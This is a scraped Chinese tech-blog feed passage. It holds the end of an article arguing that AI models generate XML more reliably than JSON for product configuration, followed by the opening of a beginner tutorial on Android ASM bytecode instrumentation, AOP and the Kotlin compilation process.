<p>AI在训练过程中接触了大量的HTML代码，这些代码拥有清晰、稳定的结构。更关键的是，XML和HTML都有<strong>强制性的闭合标签</strong>（如<code>&lt;tag&gt;</code>必须对应<code>&lt;/tag&gt;</code>），为AI提供了明确的<strong>结构“<strong>锚点</strong>”</strong>，帮助模型维持层级完整性。JSON缺乏这种自检机制。</p>
<h2 data-id="heading-5">突破性发现：被遗忘的“老兵”——XML的意外复兴</h2>
<p>在尝试了各种复杂的JSON校正方案后，我们想到了一个看似“复古”的解决方案：让AI生成XML而不是JSON。</p>
<p>结果令人惊喜：AI生成的XML结构正确率大幅提升！</p>
<pre><code class="hljs language-Plain" lang="Plain">&lt;page&gt;
  &lt;container&gt;
    &lt;header&gt;欢迎使用活字格低代码开发平台&lt;/header&gt;
    &lt;main&gt;这是一个由AI生成的示例页面&lt;/main&gt;
  &lt;/container&gt;&lt;/page&gt;
</code></pre>
<h3 data-id="heading-6">为什么XML效果更好？</h3>
<ol>
<li><strong>与HTML</strong>的高度相似性： XML和HTML共享相同的标签语法，AI对这种模式的掌握程度远超JSON。</li>
<li><strong>明确的“<strong>锚点”机制： 每个<code>&lt;tag&gt;</code>都有对应的<code>&lt;/tag&gt;</code>，为AI提供了清晰、不可或缺的</strong>闭合锚点</strong>，极大地帮助模型维持结构完整性。</li>
<li><strong>线性生成</strong>更符合AI思维： AI可以自然地按顺序处理：开标签 → 内容 → 闭标签。这是一种更“自然”的文本生成流程。</li>
</ol>
<h2 data-id="heading-7">我们的“XML中转策略”</h2>
<p>有没有和HTML类似，也可以JSON能力类似的技术？答案就是我们的老朋友XML。于是我们构建了一个简单的流程，将AI擅长生成的结构（XML）转化为我们需要的配置结构（JSON）。</p>
<h3 data-id="heading-8">第一步：让AI生成XML</h3>
<p>我们要求AI根据用户需求生成目标配置的XML表示</p>
<h3 data-id="heading-9">第二步：内部轻量级转换</h3>
<p>我们让产品支持导入XML，然后在产品内部将自己的标准功能导出为目标JSON格式。我们不依赖AI来处理JSON的严格语法，而是依赖内部工具来进行格式转换。</p>
<h3 data-id="heading-10">第三步：验证和优化</h3>
<ul>
<li>XML解析器本身能快速自动检测结构错误，帮助定位问题。</li>
<li>在转换过程中进行严格的数据验证。</li>
</ul>
<h2 data-id="heading-11">性能与效果：数据不会说谎</h2>
<p>在我们进行的测试中，XML中转策略带来了质的飞跃：</p>

























<table><thead><tr><th>指标</th><th>直接生成JSON</th><th>通过XML中转</th></tr></thead><tbody><tr><td>结构正确率</td><td>65-75%</td><td>92-98%</td></tr><tr><td>错误定位难度</td><td>困难</td><td>容易</td></tr><tr><td>可靠性</td><td>低</td><td>极高</td></tr></tbody></table>
<h2 data-id="heading-12">结论与启示</h2>
<p>通过引入XML作为AI生成的中间格式，我们成功解决了JSON生成不可靠的顽疾。</p>
<p>这个案例告诉我们：<strong>技术选型不应盲目追求新潮，而应选择最适合AI“心智模型”的工具。</strong> XML虽然在现代编程中不再时髦，但在“与AI协作生成结构化数据”这一特定场景下，它展现了比JSON更高的可靠性。</p>
<p>实践证明：<strong>在AI生成内部配置的场景中，XML确实比</strong>JSON<strong>更加可靠。</strong> 这一“复古”的解决方案为所有面临AI结构化数据生成挑战的开发者提供了新的思路。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从喝水到学会 Android ASM 插桩]]></title>    <link>https://juejin.cn/post/7575751471841853476</link>    <guid>https://juejin.cn/post/7575751471841853476</guid>    <pubDate>2025-11-24T03:05:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471841853476" data-draft-id="7573890735579103242" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从喝水到学会 Android ASM 插桩"/> <meta itemprop="keywords" content="Android,Android Studio,Kotlin"/> <meta itemprop="datePublished" content="2025-11-24T03:05:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="bqliang"/> <meta itemprop="url" content="https://juejin.cn/user/941602739853453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从喝水到学会 Android ASM 插桩
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/941602739853453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    bqliang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:05:39.000Z" title="Mon Nov 24 2025 03:05:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读34分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>首先，老手请绕道。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c7b00566ac04c648712d727552d918a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=KKsvMK8If%2F3oY9y0H6MhVzL9MUY%3D" alt="header" loading="lazy"/></p>
<p>很久前点开了一篇 ASM 的文章，很长，不少陌生的术语，对彼时的我来说有点复杂，大概翻了翻后：噢，一个可以修改字节码的东西。厉害！但反正我用不上，便关掉了页面，往后我对 ASM 的认识一直停留于此。</p>
<p>后来，工作学习中常听到</p>
<ul>
<li>Transform 接口废弃（尤其是 AGP 升级 7.0 那会）</li>
<li>无痕埋点</li>
<li>插桩</li>
</ul>
<p>一直听说这些词，但却不明所以。好吧，是时候学习一下了。</p>
<h2 data-id="heading-0">什么是"插桩"与 "AOP"？</h2>
<p>当我大概知道 ASM 是一个修改字节码的工具后，最让我好奇的不是怎么去使用它，反倒是大量出现在相关文章里的两个词——“插桩”、“AOP 切面编程”。</p>
<p>我一直都有个疑问，为什么修改字节码叫作“插桩”而不是“插码”？AOP 切面编程又是什么意思？</p>
<h3 data-id="heading-1">插桩 Instrumentation</h3>
<p>"插桩" 对应的英文是 "Instrumentation"，这个词是 Instrument 的变体/衍生词。</p>
<p>"Instrument" 是“仪器”、“仪表”的意思（比如飞机驾驶舱里的各种仪表盘）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09455fda9310403daeb1b2083dd52249~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=T0i2ssOaUr2Lqn4lXFUzJSQmDdQ%3D" alt="instrumentation.png" loading="lazy"/></p>
<p>至于 "Instrumentation"，其本意是“<strong>给……装上仪器</strong>”这个动作。比如给工厂的管道装上压力计和温度计，以便于监控它的运行状态，这个过程就叫做 "Instrumentation"。</p>
<p>这个词被软件行业借用过来，意思是：给“程序”装上“监控仪器”（也就是额外的代码），以便监控它的运行状态。</p>
<p>那“插桩”又该怎么理解呢？</p>
<ul>
<li>“插”：插入，这个很好理解，修改字节码就是把代码“插”进入；</li>
<li>“桩”：桩子，木桩，其实就是上面“仪器”的隐喻，在编程里指的是我们插入的代码。</li>
</ul>
<p>想象一下，你现在是一个土木工程师，要测量一条河流的几个关键点的水位变化，或者要标记一块地的重要坐标。你会在这些关键点“插入一个个“桩子”（测量桩 / 标记桩）。</p>
<p>在软件工程里，我们的“河流”就是程序的执行流。我们想要监控的“关键点”一般是：</p>
<ul>
<li>方法出/入口</li>
<li>一个循环的内部</li>
<li>异常被抛出的地方</li>
</ul>
<p>我们插入的代码，就像一个个“桩子”，被安插在这些关键点上，起到“测量”或“标记”的作用（比如：记录方法耗时、打印日志、上报分析数据）。</p>
<hr/>
<p>那如果我疯了，我非要用书写字节码的方式来实现业务逻辑，比如判断用户输入的字符串是否为手机号，这个过程算不算“插桩”？从广义上说，算。但 "插桩" 这个词，它侧重强调的是插入代码的“目的”。"插桩" 插入的代码（那个“桩”），其目的不是为了实现业务逻辑，而是为了：</p>
<ul>
<li>监控 (Monitoring): 比如 APM 里的性能监控；</li>
<li>调试 (Debugging): 比如打印日志；</li>
<li>分析 (Analytics): 比如埋点上报；</li>
<li>控制 (Control): 比如在方法执行前进行权限检查（AOP 的一种体现）；</li>
</ul>
<p>所以，"插桩" 特指那些为了“监控和测量”而插入的非业务代码。</p>
<h3 data-id="heading-2">AOP 切面编程</h3>
<p>AOP 即“面向切面编程”，它是一种编程思想，就像 OOP 面向对象编程一样。</p>
<p>我们先不纠结于“切面”这个词，它听起来和“插桩”一样抽象。我们先来看一个面向对象编程中很常见的“痛点”。</p>
<p>我们都知道，面向对象的核心思想是“封装、继承、多态”。它允许我们将数据（属性）和操作这些数据的逻辑（方法）“封装”到一个“类”（Class）里。</p>
<p>比如，下面定义一个 <code>Person</code> 类，它封装了 <code>name</code> 属性和 <code>eat()</code> 方法。然后再定义一个 <code>Student</code> 类，它继承自 <code>Person</code> 类，并封装了 <code>study()</code> 方法。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">open</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-keyword">val</span> name: String) {
  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 正在吃饭..."</span>)
    Thread.sleep(<span class="hljs-number">100</span>) <span class="hljs-comment">// 模拟吃饭耗时</span>
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(name: String, <span class="hljs-keyword">val</span> studentId: String) : Person(name) {
  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">study</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 正在学习..."</span>)
    Thread.sleep(<span class="hljs-number">200</span>) <span class="hljs-comment">// 模拟学习耗时</span>
  }
}
</code></pre>
<p><code>Person</code> 和 <code>Student</code> 之间形成了一条清晰的垂直继承链。<code>Student</code> 是一个 <code>Person</code>，它在 <code>Person</code> 的基础上“垂直”地构建了更具体的功能。</p>
<p>简单来说，OOP 帮我们把系统拆分成了很多个“垂直”的模块（<code>User</code> 模块、<code>Order</code> 模块...）。每个模块各司其职，管理好自己的数据和业务逻辑即可。</p>
<p>这在绝大多数情况下都是 OK 的，但总有一些“不合群”的逻辑，它们很难被归类到某一个具体的业务模块里。假设产品经理要求我们为这两个（将来可能还有几百个）方法添加耗时监控。</p>
<p>不借助 AOP 我们很可能会这么写：</p>
<pre><code class="hljs language-diff" lang="diff">open class Person(val name: String) {
  fun eat() {
<span class="hljs-addition">+   val startTime = System.currentTimeMillis()</span>
    println("$name 正在吃饭...")
    Thread.sleep(100) // 模拟吃饭耗时
<span class="hljs-addition">+   val duration = System.currentTimeMillis() - startTime</span>
<span class="hljs-addition">+   Log.d("PERF", "eat() 耗时: ${duration}ms")</span>
  }
}

class Student(name: String, val studentId: String) : Person(name) {
  fun study() {
<span class="hljs-addition">+   val startTime = System.currentTimeMillis()</span>
    println("$name 正在学习...")
    Thread.sleep(200) // 模拟学习耗时
<span class="hljs-addition">+   val duration = System.currentTimeMillis() - startTime</span>
<span class="hljs-addition">+   Log.d("PERF", "study() 耗时: ${duration}ms")</span>
  }
}
</code></pre>
<p>“耗时监控”这个功能，它并不属于 <code>Person</code> / <code>Student</code> 的核心业务，但它却像牛皮癣一样，侵入并散落在了各个业务模块中。这导致了：</p>
<ol>
<li>代码重复：每个方法里都有一套几乎一样的模板代码。</li>
<li>维护困难：如果现在想把日志从 <code>Log.d</code> 改成上报到服务器，得去修改所有地方。</li>
<li>逻辑污染：<code>eat</code> 方法的核心职责本应只是“吃”，现在却被迫“关心”自己是如何被监控的。</li>
</ol>
<p>如果把面向对象 OOP 想象成盖大楼，<code>Person</code> 是 1 楼，<code>Student</code> 是 2 楼...（同一片土地上还有各种其他大楼） 它们都是“垂直”的功能单元。那么“性能监控”、“日志打印”、“权限校验”这些功能，就像是大楼的“水电”或“消防”系统。它们需要“横跨”所有楼层，贯穿到每一个房间。这种“横跨”多个“垂直”模块的通用功能，就被称为 “横切关注点”（Cross-Cutting Concerns）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/808756289efc462ba3c1b700db79acf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=hjUOrjDGi8l2r5eu8XJK10pwr8M%3D" alt="AOP_2.png" loading="lazy"/></p>
<p>而 AOP 的核心思想，就是把这些“横切关注点”从业务逻辑中“抽离”出去，实现关注点分离。</p>
<p>AOP 允许我们将这些“横切逻辑”定义在一个独立的地方，这个地方就叫“切面”（Aspect），它就像是整栋大楼的“集中式配电箱”或“日志中心”。然后我们还需要再定义一个“规则”（比如“所有以 <code>load</code> 开头的方法”或“所有被 <code>@LogTime</code> 注解的方法”），AOP 框架就会自动把这个“切面”里的逻辑“织入”到符合规则的那些“关键点”（比如方法执行前 / 后）。</p>
<hr/>
<p>如果你写过 Python，里面的装饰器（Decorator）就是 AOP 思想的一个直观体现。</p>
<p>假设我们要实现“打印方法耗时”这个切面逻辑，用Python 装饰器来实现很简单：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 这是一个“装饰器”，它本质上是一个函数 (log_time)</span>
<span class="hljs-comment"># 它接收另一个函数 (func) 作为参数，并返回一个新的“包装后”的函数 (wrapper)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">log_time</span>(<span class="hljs-params">func</span>):  <span class="hljs-comment"># 参数 func 为被装饰的函数  </span>
  <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):      
    start = time.perf_counter()  <span class="hljs-comment"># 记录开始时间</span>
    
    result = func(*args, **kwargs)  <span class="hljs-comment"># 调用被装饰的函数, 即原始的业务逻辑函数</span>
    
    end = time.perf_counter()  <span class="hljs-comment"># 记录结束时间</span>
    cost = (end - start) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># 计算耗时，单位毫秒</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f'execute <span class="hljs-subst">{func.__name__}</span> took <span class="hljs-subst">{cost:<span class="hljs-number">.4</span>f}</span> ms'</span>) <span class="hljs-comment"># 打印耗时</span>
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># 返回结果</span>
  
  <span class="hljs-keyword">return</span> wrapper  <span class="hljs-comment"># 返回包装函数</span>
  
  
<span class="hljs-meta">@log_time </span><span class="hljs-comment"># 语法糖，这等价于: add = log_time(add), 切面逻辑在这里被"织入"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):
  <span class="hljs-keyword">return</span> a + b
  
  
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:  
  <span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)) <span class="hljs-comment"># 调用时，执行的已经是被 "wrapper" 包装过的函数了</span>

<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># execute add took 0.0008 ms</span>
<span class="hljs-comment"># 3</span>
</code></pre>
<p>通过装饰器，我们的业务方法 <code>add()</code> 内部保留了纯粹的业务逻辑。它对自己被“监控”这件事完全无感知，是 AOP 框架（这里指 Python 的装饰器语法）在外部帮我们完成了“织入”工作。</p>
<hr/>
<h3 data-id="heading-3">AOP 与“插桩”的关系</h3>
<ul>
<li>
<p><strong>AOP (面向切面)：</strong> 一种<strong>编程思想</strong>，目的是解耦“核心业务”和“横切关注点”。</p>
</li>
<li>
<p><strong>插桩 (Instrumentation)：</strong> 实现 AOP 思想的一种主要<strong>技术手段</strong>（即在特定点插入探针代码）。</p>
</li>
<li>
<p><strong>ASM：</strong> 一个（在 Java/Kotlin 领域）用来执行“插桩”的<strong>具体工具</strong>，能直接操作字节码。</p>
</li>
</ul>
<p>在 Java/Kotlin 领域，我们没有 Python 装饰器那么灵活的语法。为了在不修改业务代码的前提下，实现 AOP 切面编程，把“切面”逻辑（比如权限检查、耗时统计）“织入”到业务方法中，我们最好的办法就是在编译期去修改 <code>.class</code> 文件的字节码。而 ASM 就是一个能方便修改字节码的工具，它能找到目标方法（比如 <code>loadUserData</code>），在它的字节码开头和结尾，“插入”用于计时的“桩”（也就是那些 <code>startTime</code> 和 <code>Log.d</code> 对应的字节码指令）。</p>
<h2 data-id="heading-4">什么是 ASM</h2>
<p>ASM 是一个通用的 Java 字节码操作和分析框架。它允许你动态地读取、修改和生成 Java 字节码（<code>.class</code> 文件）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/832580e3cded40ffa714ba673aadae1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=tBab8ZmEVQL7%2BFuzxMYgaVZgL6c%3D" alt="ASM_can_do.png" loading="lazy"/></p>
<h2 data-id="heading-5">前置知识</h2>
<p>基础不牢，地动山摇。</p>
<p>既然 ASM 是用来修改字节码（<code>.class</code> 文件）的，那么我们肯定得先了解 <code>.class</code> 文件是在哪个阶段生成的，以及字节码的格式。</p>
<p>如果不知道 <code>.class</code> 文件何时生成，我们就不知道去哪里“拦截”它；如果不知道字节码格式，那么即使文件摆在面前，我们也无从下手修改。</p>
<h3 data-id="heading-6">Java 编译过程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/756095ef5bd14631998ee92233d3e341~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=hJUdIa4BiMy%2FuTVAzXrxiwbqQuU%3D" alt="How Compilation Works in Java.png" loading="lazy"/></p>
<p>我们写的 java 代码是放在 <code>.java</code> 文件里，这些文件会经过 Javac 被编译成字节码（Bytecode）也就是 <code>.class</code> 文件，执行时 <code>.class</code> 文件经由 JVM 虚拟机被翻译成机器码。</p>
<h3 data-id="heading-7">Android 打包流程</h3>
<p>再来看看 apk 的打包流程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c171b01eec35454089953e030e659b12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=%2FlfmkyuLG4ZpqlQZaxDna9tAtrg%3D" alt="Android 打包流程.png" loading="lazy"/></p>
<ol>
<li>
<p>aapt2 编译资源生成 <code>R.java</code> 和 resources.arsc；</p>
</li>
<li>
<p>kotlinc/javac 编译源码 <code>.kt</code>/<code>.java</code> 生成 <code>.class</code> 文件；</p>
</li>
<li>
<p>R8 (或 d8) 对 <code>.class</code> 文件进行混淆、优化，并转换为 <code>.dex</code> 文件；</p>
</li>
<li>
<p>apkbuilder 将 .dex、.arsc、AndroidManifest.xml 等所有文件打包成一个未签名的 <code>.apk</code> (ZIP 包)；</p>
</li>
<li>
<p>jarsigner 使用私钥对 APK 进行签名，生成可安装的 APK 文件；</p>
</li>
<li>
<p>zipalign 对 APK 包进行内存对齐优化；</p>
</li>
</ol>
<blockquote>
<p>我在网上搜上面的流程图，找到最早的一张是 11 年前，彼时 2014 年还是 Android 4.4w 和 Android 5.0 Lollipop 的时代，而我还在读初中。</p>
<p>时过境迁，Android 的打包流程也在变化，dex 编译器从 dx 到 d8 再到 r8。其次，在 Android 7.0+ 后，必须改用 V2+ 签名，打包时必须先 Zipalign 对齐再 Apksigner 签名，也就是上面最后两个步骤互相调换。</p>
</blockquote>
<p>话扯远了，本文主要是讨论 ASM 修改字节码，我们只需要知道，在 apk 打包过程中，javac / kotlinc 编译器工作后、DEX 编译器工作前，就是我们修改字节码进行插桩的时机。</p>
<h3 data-id="heading-8">初识字节码</h3>
<p>为了认识字节码，我们首先写一个简单的 <code>add()</code> 函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Utils.kt</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(a: <span class="hljs-type">Int</span>, b: <span class="hljs-type">Int</span>)</span></span> {
  <span class="hljs-keyword">return</span> a + b
}
</code></pre>
<blockquote>
<p>我们可以在 IDE 里直接通过 Tools -&gt; Kotlin -&gt; Show Kotlin Bytecode 来方便地查看文件对应的字节码，不过为了能让大家对整个过程有更好的认识，所以下面会一步一步手敲命令。</p>
</blockquote>
<p>我们先用 kotlinc 将其编译为 <code>.class</code> 文件，因为 Kotlinc 是与 IDE 捆绑的，在我的机器上，路径是：
<code>C:\Program Files\Android\Android Studio\plugins\Kotlin\kotlinc\bin\kotlinc</code></p>
<p>我们先切换（<code>cd</code>）到 Kotlin 编译器的 bin 目录：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">'C:\Program Files\Android\Android Studio\plugins\Kotlin\kotlinc\bin'</span>
</code></pre>
<p>然后使用 <code>kotlinc xxx.kt</code> 命令编译 <code>.kt</code> 文件：</p>
<pre><code class="hljs language-bash" lang="bash">.\kotlinc Utils.kt -d KotlinBytecode
</code></pre>
<blockquote>
<p>这里建议加上 -d 指定输出目录</p>
</blockquote>
<pre><code class="hljs language-scss" lang="scss">│
└─KotlinBytecode
    ├─com
    │  └─example
    │      └─helloworld (对应的包路径)
    │              UtilsKt<span class="hljs-selector-class">.class</span>
    │
    └─META-INF (包含模块信息)
            <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.kotlin_module</span>
</code></pre>
<p>因为 <code>add()</code> 函数直接写在 <code>Utils.kt</code> 文件里，Kotlin 默认会在文件名后面加上 <code>Kt</code> 来生成类，我们最终得到的就是 <code>UtilsKt.class</code> 文件。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7063563750046cc912ff7effb47a508~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=fOX49V7XDKOOzkAOE5%2FB50nfLJQ%3D" alt="hex.png" loading="lazy"/></p>
<blockquote>
<p><code>.class</code> 文件是二进制文件，里面是遵循《Java虚拟机规范》特定格式编码的机器指令（称为字节码，Bytecode）和其他元数据。需要使用专门的工具（如十六进制编辑器或 <code>javap</code> 反汇编器）才能查看其内容。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f387b7b5cd04423983cc65189d40f52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=t9r1jWp21L979DBgrylNS5YK3Oc%3D" alt="class file overview.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de3b519fee8e45218207b0723e7167f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=BaoUHePqB4OZo4Qir5SuK0p2Xl0%3D" alt="ClassFile 结构.png" loading="lazy"/>
